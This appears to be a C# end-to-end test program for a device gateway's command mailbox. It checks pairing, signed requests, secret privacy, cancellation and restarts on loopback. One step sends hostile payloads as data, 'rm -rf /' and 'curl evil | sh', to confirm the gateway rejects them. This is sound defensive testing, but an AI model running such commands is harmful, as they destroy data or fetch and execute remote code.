using System.Buffers.Text;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using Martlet.Avatar.Audio2Face.Remote;
using Martlet.Core.Nodes;
using Martlet.Gateway;

// Runs commands between Martlet computers end to end on this PC's loopback: the real gateway (Kestrel, pinned TLS, pairing,
// signed requests, the command mailbox and its storage), the desktop's real client and its real agent loop with a fixture
// runner. Two fixture devices pair: a requester and the host's agent. Nothing leaves loopback; no real credentials, Docker or
// Martlet installs are touched. Prints one JSON object {passed, steps} and exits 0 only when every step passed.
// With "network" it rehearses the Martlet network instead (NetworkRehearsal) and prints its report.
if (args is ["network"])
{
    var (networkOk, networkReport) = await Martlet.NodeLinkCheck.NetworkRehearsal.RunAsync(CancellationToken.None);
    Console.WriteLine(JsonSerializer.Serialize(networkReport));
    return networkOk ? 0 : 1;
}
// With "api" it rehearses API keys for software outside the network (ApiRehearsal) and prints its report.
if (args is ["api"])
{
    var (apiOk, apiReport) = await Martlet.NodeLinkCheck.ApiRehearsal.RunAsync(CancellationToken.None);
    Console.WriteLine(JsonSerializer.Serialize(apiReport));
    return apiOk ? 0 : 1;
}
var steps = new List<object>();
var passed = true;
void Step(string name, bool ok, string detail)
{
    steps.Add(new { name, ok, detail });
    passed &= ok;
}

try
{
    if (args is ["live", var code, var container]) await LiveAsync(code, container);
    else await RunAsync();
}
catch (Exception error) { Step("unexpected", false, $"{error.GetType().Name}: {error.Message}"); }
Console.WriteLine(JsonSerializer.Serialize(new { passed, steps }));
return passed ? 0 : 1;

// Against a real Linux gateway in a Docker container (a disposable one, built from this checkout): pairs with the one-use code
// it printed, reads its agent token the way Martlet on a host PC does (docker exec ... cat), and checks the mailbox, the saved
// commands.json and a new token after a restart.
async Task LiveAsync(string code, string container)
{
    const string tokenPath = "/var/lib/martlet/config/gateway/agent.token";
    async Task<string?> ReadAsync(string path)
    {
        var start = new System.Diagnostics.ProcessStartInfo("docker") { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
        foreach (var argument in new[] { "exec", container, "cat", path }) start.ArgumentList.Add(argument);
        using var process = System.Diagnostics.Process.Start(start)!;
        var text = await process.StandardOutput.ReadToEndAsync();
        await process.WaitForExitAsync();
        return process.ExitCode == 0 ? text.Trim() : null;
    }
    var (pairing, pairingSecret) = await HostPairingCode.Parse(code).PairAsync("check-live");
    Step("pair-live", true, $"paired as check-live with {pairing.HostId} at {pairing.Origin}");
    string? token = null;
    for (var attempt = 0; attempt < 90 && token is null; attempt++)
    {
        token = await ReadAsync(tokenPath);
        if (token is null) await Task.Delay(1000);
    }
    Step("token-readable-locally", token is { Length: 43 }, token is null ? "docker exec could not read agent.token" : "read with docker exec (43 characters)");
    using var connection = new Audio2FaceHostConnection(pairing, pairingSecret);
    var runner = new FixtureRunner();
    var agent = new NodeCommandAgent(_ => ReadAsync(tokenPath), "9.9.9", runner);
    var update = await connection.SendCommandAsync(NodeCommandKinds.Update, new Dictionary<string, string> { ["version"] = "9.9.9" });
    var pass = await agent.RunOnceAsync(connection, CancellationToken.None);
    var done = await connection.ReadCommandAsync(update.Id);
    Step("live-agent-runs-it", pass.Kind == NodeAgentPassKind.Ran && done.State == NodeCommandState.Succeeded &&
        done.Output.SequenceEqual(FixtureRunner.UpdateLines), $"{done.State}: {done.Summary}");
    const string secret = "fixture-secret-live-7d21";
    var add = await connection.SendCommandAsync(NodeCommandKinds.AddRole, new Dictionary<string, string> { ["role"] = "fixture-role" },
        new Dictionary<string, string> { ["secret.api-key"] = secret });
    var saved = await ReadAsync("/var/lib/martlet/config/gateway/commands.json") ?? "";
    pass = await agent.RunOnceAsync(connection, CancellationToken.None);
    Step("live-saved-without-secrets", saved.Contains(update.Id) && saved.Contains(add.Id) && !saved.Contains(secret) &&
        runner.SecretsSeen.Contains(secret) && pass.Outcome?.Succeeded == true,
        $"commands.json holds both commands ({saved.Length} bytes) and no secret; the agent received it");
    var restart = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("docker", ["restart", container]) { UseShellExecute = false, RedirectStandardOutput = true })!;
    await restart.WaitForExitAsync();
    HostCommandList? after = null;
    for (var attempt = 0; attempt < 30 && after is null; attempt++)
    {
        await Task.Delay(1000);
        try { after = await connection.ReadCommandsAsync(); }
        catch (Audio2FaceHostException) { }
    }
    var newToken = await ReadAsync(tokenPath);
    var oldRefused = await Expect(() => connection.TakeCommandAsync(token ?? "", null, NodeCommandKinds.All), "command.agent");
    pass = await agent.RunOnceAsync(connection, CancellationToken.None);
    Step("live-restart", after?.Commands.FirstOrDefault(c => c.Id == update.Id)?.State == NodeCommandState.Succeeded &&
        newToken is { Length: 43 } && newToken != token && oldRefused && pass.Kind == NodeAgentPassKind.Idle,
        $"commands kept: {after?.Commands.Count}; new token {(newToken != token ? "differs" : "same")}; old refused {oldRefused}; agent {pass.Kind}");
}

async Task RunAsync()
{
    using var certificate = Fixture.Certificate();
    var storage = new MemoryStorage();
    var token = Base64Url.EncodeToString(RandomNumberGenerator.GetBytes(32));
    var wrongToken = Base64Url.EncodeToString(RandomNumberGenerator.GetBytes(32));
    await using var host = await LoopbackHost.StartAsync(certificate, storage, token);
    var (requesterPairing, requesterSecret) = await host.PairAsync("check-requester");
    var (agentPairing, agentSecret) = await host.PairAsync("check-agent");
    using var asker = new Audio2FaceHostConnection(requesterPairing, requesterSecret);
    using var agentConnection = new Audio2FaceHostConnection(agentPairing, agentSecret);
    var runner = new FixtureRunner();
    var agent = new NodeCommandAgent(_ => Task.FromResult<string?>(token), "9.9.9", runner);

    var list = await asker.ReadCommandsAsync();
    Step("list-empty", list.Agent is null && list.Commands.Count == 0, $"agent {list.Agent?.DeviceId ?? "none"}, {list.Commands.Count} commands");

    var anonymous = await Raw.SendAsync(requesterPairing, null, HttpMethod.Get, "/martlet/v1/commands", null);
    Step("anonymous-refused", anonymous.Status == HttpStatusCode.Unauthorized && anonymous.Body.Contains("auth.missing"),
        $"HTTP {(int)anonymous.Status}");

    var shell = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
        """{"kind":"host.shell","arguments":{"command":"rm -rf /"}}""");
    var badVersion = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
        """{"kind":"martlet.update","arguments":{"version":"latest"}}""");
    var extraArgument = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
        """{"kind":"host.add-role","arguments":{"role":"ollama","command":"curl evil | sh"}}""");
    var extraField = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Post, "/martlet/v1/commands",
        """{"kind":"host.status","script":"x"}""");
    Step("only-known-commands", new[] { shell, badVersion, extraArgument, extraField }.All(r => r.Status == HttpStatusCode.BadRequest &&
        r.Body.Contains("request.invalid")), $"unknown kind {(int)shell.Status}, bad version {(int)badVersion.Status}, " +
        $"extra argument {(int)extraArgument.Status}, extra field {(int)extraField.Status}");

    var update = await asker.SendCommandAsync(NodeCommandKinds.Update, new Dictionary<string, string> { ["version"] = "9.9.9" });
    Step("send-update", update.State == NodeCommandState.Queued && update.RequestedBy == "check-requester",
        $"{update.Kind} {update.State} from {update.RequestedBy}");
    var again = await asker.SendCommandAsync(NodeCommandKinds.Update, new Dictionary<string, string> { ["version"] = "9.9.9" });
    Step("same-request-is-one-command", again.Id == update.Id, again.Id == update.Id ? "same ID" : "a second command");

    var stolen = await Expect(() => asker.TakeCommandAsync(wrongToken, null, NodeCommandKinds.All), "command.agent");
    var stolenReport = await Expect(() => asker.ReportCommandAsync(wrongToken, update.Id, ["fake"], "fake", NodeCommandState.Succeeded), "command.agent");
    Step("only-the-agent-takes-and-reports", stolen && stolenReport, "a paired computer without the host's local token was refused");

    var pass = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
    Step("agent-runs-it", pass.Kind == NodeAgentPassKind.Ran && pass.Outcome?.Succeeded == true, pass.Text);
    var done = await asker.ReadCommandAsync(update.Id);
    Step("requester-sees-output-and-outcome", done.State == NodeCommandState.Succeeded && done.ClaimedBy == "check-agent" &&
        done.Output.SequenceEqual(FixtureRunner.UpdateLines) && done.OutputTotal == FixtureRunner.UpdateLines.Length && done.ExitCode == 0,
        $"{done.State} by {done.ClaimedBy}; {done.OutputTotal} lines; {done.Summary}");
    list = await asker.ReadCommandsAsync();
    Step("agent-is-visible", list.Agent is { DeviceId: "check-agent", Version: "9.9.9" } && list.Agent.Kinds.Count == NodeCommandKinds.All.Count,
        $"agent {list.Agent?.DeviceId} (Martlet {list.Agent?.Version}), {list.Agent?.Kinds.Count} kinds");

    const string secret = "fixture-secret-0f3a9c";
    var add = await asker.SendCommandAsync(NodeCommandKinds.AddRole,
        new Dictionary<string, string> { ["role"] = "fixture-role", ["choice.MODEL"] = "small" },
        new Dictionary<string, string> { ["secret.api-key"] = secret });
    var listed = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Get, "/martlet/v1/commands", null);
    var one = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Get, "/martlet/v1/commands/" + add.Id, null);
    var saved = Encoding.UTF8.GetString(storage.Saved ?? []);
    pass = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
    var afterRun = await Raw.SendAsync(requesterPairing, requesterSecret, HttpMethod.Get, "/martlet/v1/commands/" + add.Id, null);
    Step("secrets-stay-private", add.HasSecrets && !listed.Body.Contains(secret) && !one.Body.Contains(secret) && !saved.Contains(secret) &&
        !afterRun.Body.Contains(secret) && runner.SecretsSeen.Count(s => s == secret) == 1 && runner.LastChoice == "small" &&
        pass.Outcome?.Succeeded == true,
        "the agent received the secret once; no list, command or saved copy contained it");

    var waiting = await asker.SendCommandAsync(NodeCommandKinds.Status, new Dictionary<string, string>());
    var withdrawn = await asker.CancelCommandAsync(waiting.Id);
    pass = await agent.RunOnceAsync(agentConnection, CancellationToken.None);
    Step("cancel-waiting", withdrawn.State == NodeCommandState.Canceled && pass.Kind == NodeAgentPassKind.Idle,
        $"{withdrawn.State}; agent then {pass.Kind}");

    var slow = await asker.SendCommandAsync(NodeCommandKinds.DescribeRole, new Dictionary<string, string> { ["role"] = "slow-role" });
    var running = agent.RunOnceAsync(agentConnection, CancellationToken.None);
    var deadline = DateTime.UtcNow.AddSeconds(15);
    while ((await asker.ReadCommandAsync(slow.Id)).State != NodeCommandState.Running && DateTime.UtcNow < deadline) await Task.Delay(200);
    var stopping = await asker.CancelCommandAsync(slow.Id);
    var finished = await Task.WhenAny(running, Task.Delay(TimeSpan.FromSeconds(20))) == running;
    var stopped = await asker.ReadCommandAsync(slow.Id);
    Step("cancel-running", stopping.CancelRequested && finished && stopped.State == NodeCommandState.Canceled && runner.Canceled,
        $"cancel requested {stopping.CancelRequested}; ended {stopped.State}");

    await asker.SendCommandAsync(NodeCommandKinds.AddRole, new Dictionary<string, string> { ["role"] = "later-role" },
        new Dictionary<string, string> { ["secret.api-key"] = secret });
    var kept = await asker.SendCommandAsync(NodeCommandKinds.Status, new Dictionary<string, string>());
    await using var restarted = await LoopbackHost.StartAsync(certificate, storage, Base64Url.EncodeToString(RandomNumberGenerator.GetBytes(32)));
    var (afterPairing, afterSecret) = await restarted.PairAsync("check-requester");
    using var afterAsker = new Audio2FaceHostConnection(afterPairing, afterSecret);
    var restored = (await afterAsker.ReadCommandsAsync()).Commands;
    var stillUpdate = restored.FirstOrDefault(c => c.Id == update.Id);
    var lostSecrets = restored.FirstOrDefault(c => c.Kind == NodeCommandKinds.AddRole && c.Arguments["role"] == "later-role");
    var stillQueued = restored.FirstOrDefault(c => c.Id == kept.Id);
    Step("restart-keeps-commands", stillUpdate?.State == NodeCommandState.Succeeded && lostSecrets?.State == NodeCommandState.Failed &&
        stillQueued?.State == NodeCommandState.Queued && !Encoding.UTF8.GetString(storage.Saved ?? []).Contains(secret),
        $"update {stillUpdate?.State}, queued with secrets {lostSecrets?.State}, queued without {stillQueued?.State}");
    var oldToken = await Expect(() => afterAsker.TakeCommandAsync(token, null, NodeCommandKinds.All), "command.agent");
    Step("new-token-each-start", oldToken, "the previous start's agent token is refused");

    for (var i = 0; i < GatewayCommandLimits.MaximumActive - 1; i++)
        await afterAsker.SendCommandAsync(NodeCommandKinds.DescribeRole, new Dictionary<string, string> { ["role"] = $"role-{i}" });
    var busy = await Expect(() => afterAsker.SendCommandAsync(NodeCommandKinds.DescribeRole, new Dictionary<string, string> { ["role"] = "one-too-many" }),
        "command.busy");
    Step("bounded-queue", busy, $"the {GatewayCommandLimits.MaximumActive + 1}th waiting command is refused");
}

static async Task<bool> Expect<T>(Func<Task<T>> call, string code)
{
    try
    {
        await call();
        return false;
    }
    catch (Audio2FaceHostException error) { return error.Code == code; }
}

static class GatewayCommandLimits
{
    internal const int MaximumActive = 8;
}

sealed class MemoryStorage : IGatewayCommandStorage
{
    internal byte[]? Saved { get; private set; }
    public byte[]? Load() => Saved;
    public void Save(byte[] bytes) => Saved = bytes;
}

sealed class NoAudit : IGatewayAuditSink
{
    public void Record(GatewayAuditEvent gatewayEvent) { }
}

/// <summary>Stands in for Martlet's command runner: prints fixed lines, records the secrets and choices it was handed and
/// waits to be canceled for describe-role.</summary>
sealed class FixtureRunner : INodeCommandRunner
{
    internal static readonly string[] UpdateLines = ["Checking the fixture release...", "Updating the fixture host service...", "Fixture host updated."];
    internal List<string> SecretsSeen { get; } = [];
    internal string? LastChoice { get; private set; }
    internal bool Canceled { get; private set; }
    public IReadOnlyList<string> Kinds => NodeCommandKinds.All;

    public async Task<NodeCommandOutcome?> RunAsync(NodeCommand command, IReadOnlyDictionary<string, string> secrets, bool resumed,
        IProgress<string> output, CancellationToken cancellationToken)
    {
        switch (command.Kind)
        {
            case NodeCommandKinds.Update:
                foreach (var line in UpdateLines) output.Report(line);
                return new(true, "FIXTURE - updated nothing.", 0);
            case NodeCommandKinds.AddRole:
                SecretsSeen.AddRange(secrets.Values);
                LastChoice = command.Arguments.GetValueOrDefault("choice.MODEL");
                output.Report("Installing the fixture role...");
                return new(true, "FIXTURE - installed nothing.", 0);
            case NodeCommandKinds.DescribeRole:
                output.Report("Waiting to be canceled...");
                try { await Task.Delay(Timeout.InfiniteTimeSpan, cancellationToken); }
                catch (OperationCanceledException) { Canceled = true; throw; }
                return new(false, "Not canceled.");
            default:
                return new(true, "FIXTURE - nothing to do.", 0);
        }
    }
}

sealed class LoopbackHost(GatewayServer server, GatewayListenerHandle listener, GatewayOrigin origin, GatewayHostIdentity identity) : IAsyncDisposable
{
    internal static async Task<LoopbackHost> StartAsync(X509Certificate2 certificate, IGatewayCommandStorage storage, string token)
    {
        var origin = new GatewayOrigin($"https://127.0.0.1:{FreePort()}");
        var identity = GatewayHostIdentity.FromCertificate("check-host", certificate);
        var server = new GatewayServer(identity, origin, [], new NoAudit());
        server.AttachCommandStorage(storage, token);
        var listener = await server.StartAsync(new GatewayTlsBinding(origin, identity, certificate), new KestrelGatewayListenerFactory());
        return new(server, listener, origin, identity);
    }

    internal async Task<(Audio2FaceHostPairing Pairing, string Secret)> PairAsync(string device)
    {
        var card = server.Pairing.OpenWindow(new() { DeviceId = device, DisplayName = device, Roles = [GatewayRole.Voice] });
        return await Audio2FaceHostClient.PairAsync(origin.CanonicalOrigin, identity.HostId, identity.SpkiFingerprint, device,
            card.PairingId, card.Token.Reveal());
    }

    private static int FreePort()
    {
        var probe = new TcpListener(IPAddress.Loopback, 0);
        probe.Start();
        try { return ((IPEndPoint)probe.LocalEndpoint).Port; }
        finally { probe.Stop(); }
    }

    public ValueTask DisposeAsync() => listener.DisposeAsync();
}

/// <summary>Signed requests the desktop client would never send (unknown commands, extra fields), signed the same way.</summary>
static class Raw
{
    internal static async Task<(HttpStatusCode Status, string Body)> SendAsync(Audio2FaceHostPairing pairing, string? secret, HttpMethod method,
        string path, string? json)
    {
        using var handler = new SocketsHttpHandler();
        handler.SslOptions.RemoteCertificateValidationCallback = (_, certificate, _, _) =>
            certificate is X509Certificate2 presented &&
            "sha256:" + Convert.ToHexStringLower(SHA256.HashData(presented.PublicKey.ExportSubjectPublicKeyInfo())) == pairing.SpkiFingerprint;
        using var http = new HttpClient(handler);
        var body = json is null ? [] : Encoding.UTF8.GetBytes(json);
        using var request = new HttpRequestMessage(method, pairing.Origin + path);
        if (json is not null)
        {
            request.Content = new ByteArrayContent(body);
            request.Content.Headers.ContentType = new("application/json") { CharSet = "utf-8" };
        }
        if (secret is not null)
        {
            var key = SHA256.HashData(Base64Url.DecodeFromChars(secret));
            var nonce = Base64Url.EncodeToString(RandomNumberGenerator.GetBytes(24));
            var timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString(System.Globalization.CultureInfo.InvariantCulture);
            var canonical = Encoding.ASCII.GetBytes(string.Join('\n', "martlet-request-v1", pairing.HostId, pairing.CredentialId, method.Method, path,
                "voice", timestamp, nonce, Convert.ToHexStringLower(SHA256.HashData(body))));
            request.Headers.TryAddWithoutValidation("Authorization",
                $"Martlet-HMAC {pairing.CredentialId}.{Base64Url.EncodeToString(HMACSHA256.HashData(key, canonical))}");
            request.Headers.TryAddWithoutValidation("X-Martlet-Nonce", nonce);
            request.Headers.TryAddWithoutValidation("X-Martlet-Timestamp", timestamp);
            request.Headers.TryAddWithoutValidation("X-Martlet-Role", "voice");
        }
        using var response = await http.SendAsync(request);
        return (response.StatusCode, await response.Content.ReadAsStringAsync());
    }
}

static class Fixture
{
    /// <summary>A throwaway self-signed loopback certificate (FIXTURE): never a real host identity.</summary>
    internal static X509Certificate2 Certificate()
    {
        using var key = ECDsa.Create(ECCurve.NamedCurves.nistP256);
        var request = new CertificateRequest("CN=Martlet node link check (fixture)", key, HashAlgorithmName.SHA256);
        request.CertificateExtensions.Add(new X509BasicConstraintsExtension(false, false, 0, true));
        request.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature, true));
        request.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new("1.3.6.1.5.5.7.3.1") }, true));
        var names = new SubjectAlternativeNameBuilder();
        names.AddIpAddress(IPAddress.Loopback);
        request.CertificateExtensions.Add(names.Build());
        using var ephemeral = request.CreateSelfSigned(DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(30));
        return X509CertificateLoader.LoadPkcs12(ephemeral.Export(X509ContentType.Pkcs12), null);
    }
}
